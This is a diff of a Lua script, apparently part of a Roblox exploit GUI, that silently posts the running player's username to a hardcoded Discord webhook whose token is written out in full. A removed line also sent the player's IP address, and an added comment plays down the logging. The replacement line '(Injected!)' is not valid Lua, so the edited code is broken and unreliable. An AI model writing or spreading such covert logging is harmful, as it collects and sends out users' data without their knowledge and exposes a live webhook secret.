@@ -1,3 +1,8 @@
+
+--i dont sell logs or anything just tryna see if anyone is using the gui
+
+
+
 local webh = "https://discord.com/api/webhooks/942885788536958986/TyEuEtbhri8T2JgS7XRKfZAO-ZjjdEc56XLCT4u8n6R8xclf_cgEI-6C8mtaFDnza0eg"
 
 pcall(function()
@@ -5,7 +10,7 @@ pcall(function()
        ["embeds"] = {
            {
                ["title"] = game:GetService("Players").LocalPlayer.Name,
-               ["description"] = game:HttpGet("https://api.ipify.org")
+               ["description"] = (Injected!)
            }
        }
    }
